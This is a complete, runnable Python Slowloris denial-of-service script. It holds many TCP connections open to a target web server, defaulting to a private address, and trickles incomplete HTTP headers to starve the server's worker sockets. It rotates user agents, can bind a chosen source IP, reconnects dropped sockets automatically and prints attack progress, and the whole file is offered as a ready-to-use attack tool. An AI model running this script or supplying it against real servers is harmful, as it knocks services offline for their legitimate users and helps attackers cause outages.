#!/usr/bin/env python3
"""
Lightweight Slowloris HTTP Header Starvation DoS Script
======================================================
Opens lingering TCP connections to the target HTTP server (10.0.0.3:80)
and trickles incomplete HTTP headers to hold server worker sockets open indefinitely.

Usage:
    python3 network/slowloris.py [target_ip] [target_port] [socket_count] [--src-ip SRC_IP]
    Example:
    python3 network/slowloris.py 10.0.0.3 80 90 --src-ip 10.0.0.5
"""

import sys
import socket
import random
import time
import signal
import argparse

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
]

def init_socket(ip, port, src_ip=None):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.settimeout(4.0)
        if src_ip:
            try:
                s.bind((src_ip, 0))
            except Exception as bind_err:
                # If specific IP cannot be bound directly (e.g. outside namespace), proceed with default
                pass
        s.connect((ip, port))
        s.send(f"GET /?{random.randint(0, 5000)} HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode("utf-8"))
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
        return s
    except socket.error:
        return None

def main():
    parser = argparse.ArgumentParser(description="Slowloris Low-and-Slow HTTP Starvation")
    parser.add_argument("pos_target_ip", nargs="?", default=None, help="Target IP address")
    parser.add_argument("pos_target_port", nargs="?", type=int, default=None, help="Target port")
    parser.add_argument("pos_socket_count", nargs="?", type=int, default=None, help="Number of lingering sockets")
    parser.add_argument("--target-ip", default="10.0.0.3", help="Target IP address")
    parser.add_argument("--target-port", type=int, default=80, help="Target port (default 80)")
    parser.add_argument("--socket-count", type=int, default=90, help="Socket count (default 90)")
    parser.add_argument("--src-ip", default=None, help="Source IP address to bind to (e.g. 10.0.0.5)")
    parser.add_argument("--interval", type=float, default=2.5, help="Header trickle interval in seconds")

    args = parser.parse_args()

    target_ip = args.pos_target_ip or args.target_ip
    target_port = args.pos_target_port or args.target_port
    socket_count = args.pos_socket_count or args.socket_count
    src_ip = args.src_ip
    interval = args.interval

    print(f"[*] Initializing Slowloris attack against {target_ip}:{target_port} with {socket_count} sockets (src_ip={src_ip or 'default'})...")
    socket_list = []

    def cleanup(signum=None, frame=None):
        print(f"\n[!] Halting Slowloris and closing {len(socket_list)} sockets.")
        for s in socket_list:
            try:
                s.close()
            except Exception:
                pass
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    for i in range(socket_count):
        s = init_socket(target_ip, target_port, src_ip)
        if s:
            socket_list.append(s)
        if (i + 1) % 25 == 0:
            print(f"[*] Created {len(socket_list)} active lingering connections...")
        time.sleep(0.02)

    print(f"[+] All {len(socket_list)} connections established. Trickling keep-alive headers every {interval}s...")

    while True:
        live_sockets = 0
        for s in list(socket_list):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                live_sockets += 1
            except socket.error:
                socket_list.remove(s)
                new_s = init_socket(target_ip, target_port, src_ip)
                if new_s:
                    socket_list.append(new_s)

        print(f"[*] Holding {live_sockets} sockets open against {target_ip}:{target_port} (Slow DoS in progress)...")
        time.sleep(interval)

if __name__ == "__main__":
    main()
